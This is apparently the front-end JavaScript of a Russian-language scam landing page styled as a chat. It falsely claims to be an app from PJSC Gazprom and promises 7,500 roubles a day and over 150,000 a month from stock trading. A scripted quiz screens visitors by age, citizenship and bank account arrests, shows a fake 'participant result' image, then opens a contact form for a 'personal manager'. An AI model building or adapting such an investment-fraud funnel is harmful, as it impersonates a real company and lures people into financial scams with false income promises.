document.addEventListener("DOMContentLoaded", () => {
  const lastMessageContainer = document.querySelector(".main-chat");
  const footer = document.querySelector(".footer");
  const footerInput = footer.querySelector(".footer__input");
  const footerBtn = footer.querySelector(".footer__btn");
  const errorField = footer.querySelector(".field__error");

  const targetQuestions = [
    "Сколько вам лет?",
    "Вы являетесь гражданином РФ (есть ли у вас гражданство РФ)?",
    "Верите ли вы в то что можно заработать от 150.000₽ в месяц?",
    "Как лучше всего с Вами связаться? (Выберите один)",
    "Есть ли у Вас аресты счетов или банкротство?",
  ];
  const answerMap = {};

  const contentArray = [
    `Добро пожаловать в наше приложение разработанное кампанией ПАО "Газпром"`,
    "Поздравляю! Теперь для Вас открыта возможность зарабатывать на акциях лучших компаний всего мира!",
    "Всего несколько шагов отделяют вас от стартового дохода 7500 рублей в день!",
    "Пожалуйста, ответьте на следующие вопросы:",
  ];
  const questions = [
    "Сколько вам лет?",
    "Вы являетесь гражданином РФ (есть ли у вас гражданство РФ)?",
    "Верите ли вы в то что можно заработать от 150.000₽ в месяц?",
    "Есть ли у Вас аресты счетов или банкротство?",
    "Спасибо за уделённое время и пройденный опрос! Теперь Вам открыт доступ к официальной платформе проекта «ГАЗПРОМ». Пожалуйста, оставьте свои контактные данные для регистрации. Ваш личный менеджер свяжется с Вами в течении одного рабочего дня!",
  ];
  const answers = [
    ["До 21", "21-24", "25-44", "45-69", "70+"],
    ["Да, являюсь гражданином РФ", "Нет, не являюсь гражданином РФ"],
    ["Да", "Нет"],
    ["Да", "Нет"],
    null,
  ];

  let counter = 0;
  let trackCounter = 1;
  let questionCounter = 0;
  let waiting = false;
  const now = new Date();
  const currentTime = now.toLocaleTimeString("en-US", {
    hour: "2-digit",
    minute: "2-digit",
    hour12: false,
  });

  localStorage.removeItem("answers");

  if (counter < contentArray.length) {
    createDivWithInterval();
  }

  function saveAnswer(question, answer) {
    let answers = JSON.parse(localStorage.getItem("answers")) || [];
    answers.push(`${question}: ${answer}`);
    localStorage.setItem("answers", JSON.stringify(answers));
  }

  function createDivWithInterval() {
    if (counter < contentArray.length) {
      const typingMessage = document.createElement("div");
      typingMessage.className = "left-chat";
      typingMessage.innerHTML = '<div class="chat-block">...</div>';
      lastMessageContainer.appendChild(typingMessage);
      lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;

      setTimeout(() => {
        typingMessage.innerHTML = `<div class="chat-block">${contentArray[counter]}</div>`;
        const timeElement = document.createElement("div");
        timeElement.className = "time";
        timeElement.innerText = currentTime;
        typingMessage.querySelector(".chat-block").appendChild(timeElement);

        lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;
        counter++;

        if (counter < contentArray.length) {
          setTimeout(createDivWithInterval, 600);
        } else {
          postQuestion(
            questions[questionCounter],
            answers[questionCounter],
            "vertical",
            questionCounter
          );
        }
      }, 600);
    }
  }

  function postQuestion(question, answers, rotation) {
    const typingMessage = document.createElement("div");
    typingMessage.className = `left-chat message-index-${questionCounter}`;
    typingMessage.innerHTML = '<div class="chat-block">...</div>';

    lastMessageContainer.appendChild(typingMessage);
    typingMessage.scrollIntoView({ behavior: "smooth" });

    setTimeout(() => {
      typingMessage.innerHTML = `<div class="chat-block">${question}</div>`;
      const timeElement = document.createElement("div");
      timeElement.className = "time";
      timeElement.innerText = currentTime;
      typingMessage.querySelector(".chat-block").appendChild(timeElement);

      if (answers) {
        const newButtons = document.createElement("div");
        newButtons.className = rotation;
        answers.forEach((item) => {
          const button = document.createElement("button");
          button.type = "button";
          button.className = `answer-btn answer-btn-${questionCounter}`;
          button.innerHTML = item;
          newButtons.appendChild(button);

          button.addEventListener("click", (e) => {
            if (questionCounter !== 6) {
              trackCounter++;
              waiting = true;
              sendMessage("button", item);

              const btns = document.querySelectorAll(
                `.answer-btn-${questionCounter}`
              );
              btns.forEach((btn) => {
                btn.disabled = true;
              });
            }
          });
        });
        lastMessageContainer.appendChild(newButtons);

        const thirdQuestionBtns = document.querySelectorAll(".answer-btn-2");

        thirdQuestionBtns.forEach((btn) => {
          btn.addEventListener("click", () => {
            const newMessage1 = document.createElement("div");
            newMessage1.className = "left-chat with-avatar";
            newMessage1.innerHTML = `
      <div class="chat-block" style="flex-direction: column;">
        <img src="./images/result.jpg" style="width: 290px; margin: 0 auto; margin-bottom: 10px;}"/>
        <p>Результат нового участника платформы за ноябрь!</p>
      </div>
    `;
            const timeElement = document.createElement("div");
            timeElement.className = "time";
            timeElement.innerText = currentTime;
            newMessage1.querySelector(".chat-block").appendChild(timeElement);
            lastMessageContainer.appendChild(newMessage1);
            lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;
          });
        });

        const fourthQuestionBtn = document.querySelectorAll(".answer-btn-3");
        console.log(fourthQuestionBtn);

        fourthQuestionBtn.forEach((btn) => {
          btn.addEventListener("click", (e) => {
            if (btn.textContent === "Нет") {
              showForm();
            }
            return;
          });
        });
      }
      lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;
    }, 1000);
  }

  function sendMessage(type, content) {
    let rotation = "vertical";

    // if (questionCounter === 0 || questionCounter === 2) {
    //   rotation = "horizontal";
    // }

    if (type == "button") {
      const currentQuestion = questions[questionCounter];

      saveAnswer(currentQuestion, content);

      if (targetQuestions.includes(currentQuestion)) {
        answerMap[currentQuestion] = content;
      }

      const newMessage = document.createElement("div");
      newMessage.className = "right-chat";
      newMessage.innerHTML = `
        <div class="chat-block">${content}</div>
        <input type="hidden" name="${questions[questionCounter]}" value="${content}">
      `;
      lastMessageContainer.appendChild(newMessage);

      const timeElement = document.createElement("div");
      timeElement.className = "time-right";
      timeElement.innerText = currentTime;
      newMessage
        .querySelector(".right-chat .chat-block")
        .appendChild(timeElement);

      lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;

      if (
        questions[questionCounter] ===
          "Вы являетесь гражданином РФ (есть ли у вас гражданство РФ)?" &&
        content === "Нет, не являюсь гражданином РФ"
      ) {
        localStorage.setItem("unsuitable", false);
        const newMessage1 = document.createElement("div");
        newMessage1.className = "left-chat with-avatar";
        newMessage1.innerHTML = `
          <div class="chat-block"> Спасибо за желание участвовать в программе ГАЗПРОМ, однако участие в ней могут принимать только граждане РФ, достигшие 21 года. Хорошего дня!</div>
        `;
        const timeElement = document.createElement("div");
        timeElement.className = "time";
        timeElement.innerText = currentTime;
        newMessage1.querySelector(".chat-block").appendChild(timeElement);

        lastMessageContainer.appendChild(newMessage1);
        lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;
        return false;
      } else {
        if (localStorage.getItem("isCodeExecuted") !== "true") {
          localStorage.setItem("isCodeExecuted", "true");
        } else {
        }
      }
      if (
        questions[questionCounter] ===
          "Есть ли у Вас аресты счетов или банкротство?" &&
        content === "Да"
      ) {
        localStorage.setItem("unsuitable", false);
        const newMessage1 = document.createElement("div");
        newMessage1.className = "left-chat with-avatar";
        newMessage1.innerHTML = `
          <div class="chat-block">  Благодарим за интерес к программе ГАЗПРОМ.
К сожалению, в соответствии с внутренними требованиями, участие в программе невозможно при наличии действующих арестов счетов или статуса банкротства.
Благодарим за понимание. Хорошего дня!

</div>
        `;
        const timeElement = document.createElement("div");
        timeElement.className = "time";
        timeElement.innerText = currentTime;
        newMessage1.querySelector(".chat-block").appendChild(timeElement);

        lastMessageContainer.appendChild(newMessage1);
        lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;
        return false;
      } else {
        if (localStorage.getItem("isCodeExecuted") !== "true") {
          localStorage.setItem("isCodeExecuted", "true");
        } else {
        }
      }
      if (
        questions[questionCounter] === "Сколько вам лет?" &&
        content === "До 21"
      ) {
        const newMessage1 = document.createElement("div");
        newMessage1.className = "left-chat with-avatar";
        newMessage1.innerHTML = `
          <div class="chat-block"> Спасибо за желание участвовать в программе ГАЗПРОМ, однако участие в ней могут принимать только граждане РФ, достигшие 21 года. Хорошего дня!
</div>
        `;
        const timeElement = document.createElement("div");
        timeElement.className = "time";
        timeElement.innerText = currentTime;
        newMessage1.querySelector(".chat-block").appendChild(timeElement);
        localStorage.setItem("unsuitable", false);
        lastMessageContainer.appendChild(newMessage1);
        lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;
        return false;
      }
      if (
        questions[questionCounter] === "Сколько вам лет?" &&
        content === "70+"
      ) {
        const newMessage1 = document.createElement("div");
        newMessage1.className = "left-chat with-avatar";
        newMessage1.innerHTML = `
          <div class="chat-block"> Благодарим за интерес к программе ГАЗПРОМ.
К сожалению, по закону РФ участвовать могут только граждане от 21 до 69 лет включительно.
Хорошего дня!</div>`;
        const timeElement = document.createElement("div");
        timeElement.className = "time";
        timeElement.innerText = currentTime;
        newMessage1.querySelector(".chat-block").appendChild(timeElement);
        localStorage.setItem("unsuitable", false);
        lastMessageContainer.appendChild(newMessage1);
        lastMessageContainer.scrollTop = lastMessageContainer.scrollHeight;
        return false;
      }

      if (waiting) {
        setTimeout(() => {
          questionCounter++;
          let rotation = "vertical";
          // if (questionCounter === 1) {
          //   rotation = "horizontal";
          // }
          // if (questionCounter === 0 || questionCounter === 4) {
          //   rotation = "vertical";
          // }
          postQuestion(
            questions[questionCounter],
            answers[questionCounter],
            rotation,
            questionCounter
          );
        }, 500);
        waiting = false;
      }
    } else {
      postQuestion(
        questions[questionCounter],
        answers[questionCounter],
        rotation
      );
    }
  }

  function showForm() {
    const form = document.getElementById("main-form");
    setTimeout(() => {
      form.classList.remove("hidden");
      window.scrollTo({
        top: 500,
        behavior: "smooth",
      });
    }, 1400);
  }
});
